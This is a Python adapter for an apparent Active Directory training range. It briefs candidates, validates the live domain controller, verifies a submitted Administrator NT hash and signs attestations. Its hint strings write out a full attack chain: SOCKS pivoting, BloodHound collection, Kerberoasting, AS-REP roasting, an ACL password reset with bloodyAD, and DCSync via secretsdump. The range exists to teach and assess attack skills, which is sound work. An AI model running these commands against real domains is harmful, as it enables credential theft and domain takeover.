"""Portal-side adapter for the live-execution AD range (the Samba AD DC on Railway).

This is the Railway-native counterpart to broker.py (which drives Ludus/GOAD on a Proxmox host).
Railway cannot run Windows VMs or nested virtualization, so the live range is a real Samba Active
Directory Domain Controller; this module is how the portal talks to it:

  enabled()              is the live range configured for this environment?
  connection_details(c)  the candidate-facing briefing: host, ports, realm, foothold creds, objective
  validate_live()        a REAL technical-validation probe of the DC over Railway's private network
                         (the token-gated /validate proof endpoint): is it live and is the attack path
                         actually planted? Fail-closed if unreachable - never a fabricated pass.
  verify_compromise(s)   verify a candidate's DCSync proof (the Administrator NT hash) against the
                         expected hash derived from the shared admin secret. Unfakeable: the only way
                         to obtain the hash is to really compromise the domain.
  attest(...)/verify_*   build and verify an Ed25519-signed live-compromise attestation that credits
                         the isolated-board (5/6) live objective under governance.

HONESTY
-------
A live compromise is credited ONLY when (a) the proof-of-compromise hash matches AND (b) the live
technical-validation probe passes AND (c) the operator has confirmed the live range by setting
ADRANGE_ADAPTER_VERIFIED=1 (mirrors broker.adapter_verified()). Any of these missing -> not creditable.
Nothing here derives credit from a configured URL alone.
"""
from __future__ import annotations

import datetime as _dt
import json
import os
import struct
import urllib.error
import urllib.request

import signing

ATTEST_KIND = "adrange_compromise"
ATTEST_VERSION = 1


# --- NT hash (MD4 of UTF-16LE); modern OpenSSL disables md4, so inline it ------
def _md4(data: bytes) -> bytes:
    def lrot(x, n):
        x &= 0xFFFFFFFF
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    a, b, c, d = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    msg = bytearray(data)
    bits = (8 * len(data)) & 0xFFFFFFFFFFFFFFFF
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", bits)
    for off in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[off:off + 64]))
        aa, bb, cc, dd = a, b, c, d
        for i in (0, 4, 8, 12):
            a = lrot(a + ((b & c) | (~b & d)) + X[i], 3)
            d = lrot(d + ((a & b) | (~a & c)) + X[i + 1], 7)
            c = lrot(c + ((d & a) | (~d & b)) + X[i + 2], 11)
            b = lrot(b + ((c & d) | (~c & a)) + X[i + 3], 19)
        for i in (0, 1, 2, 3):
            a = lrot(a + ((b & c) | (b & d) | (c & d)) + X[i] + 0x5A827999, 3)
            d = lrot(d + ((a & b) | (a & c) | (b & c)) + X[i + 4] + 0x5A827999, 5)
            c = lrot(c + ((d & a) | (d & b) | (a & b)) + X[i + 8] + 0x5A827999, 9)
            b = lrot(b + ((c & d) | (c & a) | (d & a)) + X[i + 12] + 0x5A827999, 13)
        for i in (0, 2, 1, 3):
            a = lrot(a + (b ^ c ^ d) + X[i] + 0x6ED9EBA1, 3)
            d = lrot(d + (a ^ b ^ c) + X[i + 8] + 0x6ED9EBA1, 9)
            c = lrot(c + (d ^ a ^ b) + X[i + 4] + 0x6ED9EBA1, 11)
            b = lrot(b + (c ^ d ^ a) + X[i + 12] + 0x6ED9EBA1, 15)
        a = (a + aa) & 0xFFFFFFFF
        b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF
        d = (d + dd) & 0xFFFFFFFF
    return struct.pack("<4I", a, b, c, d)


def nt_hash(password: str) -> str:
    return _md4(password.encode("utf-16-le")).hex()


# --- config ------------------------------------------------------------------
def _truthy(v) -> bool:
    return str(v or "").strip().lower() in ("1", "true", "yes", "on")


def enabled() -> bool:
    """The live range is offered when it is switched on AND a candidate-facing host is configured."""
    return _truthy(os.environ.get("ADRANGE_ENABLED")) and bool(os.environ.get("ADRANGE_HOST"))


def adapter_verified() -> bool:
    """An operator has confirmed the live range is really up (mirrors broker.adapter_verified)."""
    return _truthy(os.environ.get("ADRANGE_ADAPTER_VERIFIED"))


def realm() -> str:
    return os.environ.get("ADRANGE_REALM", "QWALORA.RANGE")


def netbios() -> str:
    return os.environ.get("ADRANGE_NETBIOS", (realm().split(".")[0] or "QWALORA")).upper()


def _ports() -> dict:
    """Parse ADRANGE_PORTS='ldap=12345,kerberos=23456,...' into {service: int}."""
    out = {}
    for pair in (os.environ.get("ADRANGE_PORTS", "") or "").split(","):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            try:
                out[k.strip().lower()] = int(v.strip())
            except ValueError:
                pass
    return out


def foothold() -> dict:
    return {"username": os.environ.get("ADRANGE_FOOTHOLD_USER", "ranger"),
            "password": os.environ.get("ADRANGE_FOOTHOLD_PASSWORD", "")}


def socks() -> dict:
    """The SOCKS5 pivot the candidate tunnels through. Railway exposes one TCP proxy per service, so
    a SOCKS pivot gives access to every AD port at its standard number. ADRANGE_HOST/ADRANGE_SOCKS_PORT
    are the public proxy endpoint; the creds gate the proxy (shown to the candidate, not secret)."""
    return {"host": os.environ.get("ADRANGE_HOST", ""),
            "port": int(os.environ.get("ADRANGE_SOCKS_PORT", "0") or 0),
            "username": os.environ.get("ADRANGE_SOCKS_USER", "ranger"),
            "password": os.environ.get("ADRANGE_SOCKS_PASSWORD", "")}


def expected_admin_nt_hash() -> str | None:
    pw = os.environ.get("ADRANGE_ADMIN_PASSWORD")
    return nt_hash(pw) if pw else None


# The DC is reached at its own loopback THROUGH the SOCKS pivot (microsocks runs in the DC container).
_TARGET = "127.0.0.1"


def connection_details(candidate=None) -> dict:
    """Everything a candidate needs to attack the range. Never includes the admin password or proof
    material - only the foothold they are legitimately given and the SOCKS pivot they tunnel through."""
    sk = socks()
    fh = foothold()
    r = realm()
    proxychains_conf = ("[ProxyList]\nsocks5 %s %s %s %s"
                        % (sk["host"], sk["port"], sk["username"], sk["password"]))
    return {
        "enabled": enabled(),
        "realm": r,
        "domain": netbios(),
        "socks": sk,
        "proxychains_conf": proxychains_conf,
        "target": _TARGET,
        "foothold": fh,
        "objective": ("Pivot in through the SOCKS proxy, compromise the domain via the planted path, "
                      "DCSync the Administrator account, and submit its NT hash as proof."),
        "hints": [
            "Add the SOCKS pivot to /etc/proxychains4.conf:  socks5 %s %s %s %s"
            % (sk["host"], sk["port"], sk["username"], sk["password"]),
            "Collect the graph:  proxychains bloodhound-python -d %s -u %s -p '<pw>' -ns %s "
            "--dns-tcp -c all" % (r, fh["username"], _TARGET),
            "Kerberoast:  proxychains GetUserSPNs.py %s/%s:'<pw>' -dc-ip %s -request"
            % (r, fh["username"], _TARGET),
            "AS-REP roast:  proxychains GetNPUsers.py %s/ -usersfile users.txt -dc-ip %s"
            % (r, _TARGET),
            "Abuse the ACL:  proxychains bloodyAD -u %s -p '<pw>' -d %s --host %s set password "
            "svc_mssql '<newpw>'" % (fh["username"], r, _TARGET),
            "DCSync:  proxychains secretsdump.py %s/svc_mssql:'<newpw>'@%s -just-dc-user Administrator"
            % (r, _TARGET),
        ],
    }


# --- live technical-validation probe (private proof server) -------------------
def _internal_url() -> str:
    return (os.environ.get("ADRANGE_INTERNAL_URL") or "").rstrip("/")


def validate_live(timeout: float = 6.0) -> dict:
    """Probe the DC's private /validate endpoint (token-gated, Railway-internal). Returns
    {ok, reachable, checks, reason}. Fail-closed: any error -> ok False, reachable False."""
    base = _internal_url()
    token = os.environ.get("ADRANGE_PROOF_TOKEN", "")
    if not base or not token:
        return {"ok": False, "reachable": False, "checks": {},
                "reason": "live-range internal URL/token not configured"}
    req = urllib.request.Request(base + "/validate", headers={"X-Proof-Token": token})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = json.loads(r.read().decode() or "{}")
    except (urllib.error.URLError, TimeoutError, ValueError, OSError) as e:
        return {"ok": False, "reachable": False, "checks": {},
                "reason": "proof endpoint unreachable: %s" % e}
    checks = data.get("checks") or {}
    ok = bool(data.get("ok")) and all(
        v is True for k, v in checks.items() if k != "error")
    return {"ok": ok, "reachable": True, "checks": checks,
            "reason": "live technical validation passed" if ok
            else "live range reachable but attack path not fully validated"}


# --- proof of compromise -----------------------------------------------------
def parse_submitted_hash(text: str) -> str | None:
    """Pull an NT hash out of whatever the candidate pastes: a bare 32-hex NT hash, an
    'LM:NT' pair, or a full secretsdump line 'user:rid:lm:nt:::'. Returns the lowercase NT hash."""
    if not text:
        return None
    t = text.strip().strip("'\"").strip()
    # secretsdump line: name:rid:lm:nt:::
    parts = t.split(":")
    cand = None
    if len(parts) >= 4 and all(len(parts[i]) == 32 for i in (2, 3)):
        cand = parts[3]
    elif len(parts) == 2 and len(parts[1]) == 32:
        cand = parts[1]
    elif len(parts) == 1 and len(parts[0]) == 32:
        cand = parts[0]
    if cand and all(ch in "0123456789abcdefABCDEF" for ch in cand):
        return cand.lower()
    return None


def verify_compromise(submission: str) -> dict:
    """Verify a DCSync proof. Returns {ok, reason, submitted_nt}. ok only when the parsed NT hash
    exactly equals the expected Administrator NT hash (constant-time compare)."""
    expected = expected_admin_nt_hash()
    got = parse_submitted_hash(submission)
    if not expected:
        return {"ok": False, "reason": "range admin secret not configured", "submitted_nt": got}
    if not got:
        return {"ok": False, "reason": "no NT hash found in submission", "submitted_nt": None}
    import hmac
    ok = hmac.compare_digest(got, expected.lower())
    return {"ok": ok,
            "reason": "administrator hash verified - real domain compromise"
            if ok else "hash does not match the domain Administrator",
            "submitted_nt": got}


# --- creditability + attestation ---------------------------------------------
def creditable(validation: dict, proof: dict) -> bool:
    """A live compromise backs objective credit ONLY with a confirmed adapter AND a passing live
    technical-validation AND a verified proof of compromise. Fail-closed on any gap."""
    return bool(adapter_verified() and validation.get("ok") and proof.get("ok"))


def _now():
    return _dt.datetime.now(_dt.timezone.utc)


def attest(candidate, board, *, cohort=None, attempt=1, validation=None, proof=None,
           scenario=None):
    """Build and Ed25519-sign a live-compromise attestation. Returns (creditable, record).

    Binds candidate identity + board/attempt + the real validation checks + the verified proof. It
    never contains the admin password or the full proof hash (only a short fingerprint), so the
    record is safe to store and show."""
    validation = validation or validate_live()
    proof = proof or {"ok": False, "reason": "no proof supplied"}
    now = _now()
    cred = creditable(validation, proof)
    nt = proof.get("submitted_nt") or ""
    claim = {
        "kind": ATTEST_KIND,
        "attestation_version": ATTEST_VERSION,
        "handle": getattr(candidate, "handle", None),
        "candidate_github_id": getattr(candidate, "github_id", None),
        "cohort": cohort if cohort is not None else getattr(candidate, "cohort", None),
        "board": int(board),
        "attempt": int(attempt or 1),
        "realm": realm(),
        "range": "samba-ad-dc (railway live-execution)",
        "technical_validation": {"passed": bool(validation.get("ok")),
                                 "reachable": bool(validation.get("reachable")),
                                 "checks": validation.get("checks") or {},
                                 "reason": validation.get("reason")},
        "proof_of_compromise": {"verified": bool(proof.get("ok")),
                                "target": "Administrator",
                                "nt_fingerprint": (nt[:8] + "..." if nt else None),
                                "reason": proof.get("reason")},
        "adapter_verified": adapter_verified(),
        "mode": "real" if cred else "unavailable",
        "real": bool(cred),
        "scenario_ref": (scenario or {}).get("scenario_ref"),
        "at": now.isoformat(),
    }
    record = dict(claim)
    record["signature"] = signing.sign(claim)
    return cred, record


def verify_attestation(record, *, handle=None, board=None, cohort=None, attempt=None, now=None):
    """Verify a stored live-compromise attestation: signature authentic, identity matches (when
    supplied), and the record is a real creditable compromise. Returns (ok, reason)."""
    if not isinstance(record, dict) or not record.get("signature"):
        return False, "no attestation / unsigned"
    claim = {k: record[k] for k in record if k != "signature"}
    try:
        if not signing.verify(claim, record["signature"]):
            return False, "signature invalid (forged or altered)"
    except Exception:  # noqa: BLE001
        return False, "signature could not be verified"
    if record.get("kind") != ATTEST_KIND:
        return False, "wrong attestation kind"
    for field, want in (("handle", handle), ("board", board),
                        ("cohort", cohort), ("attempt", attempt)):
        if want is not None and record.get(field) != want:
            return False, "attestation %s mismatch (foreign/superseded)" % field
    if not (record.get("real") is True and record.get("mode") == "real"):
        return False, "attestation is not a creditable real compromise"
    tv = record.get("technical_validation") or {}
    poc = record.get("proof_of_compromise") or {}
    if not tv.get("passed") or not poc.get("verified"):
        return False, "attestation lacks verified validation/proof"
    return True, "ok"
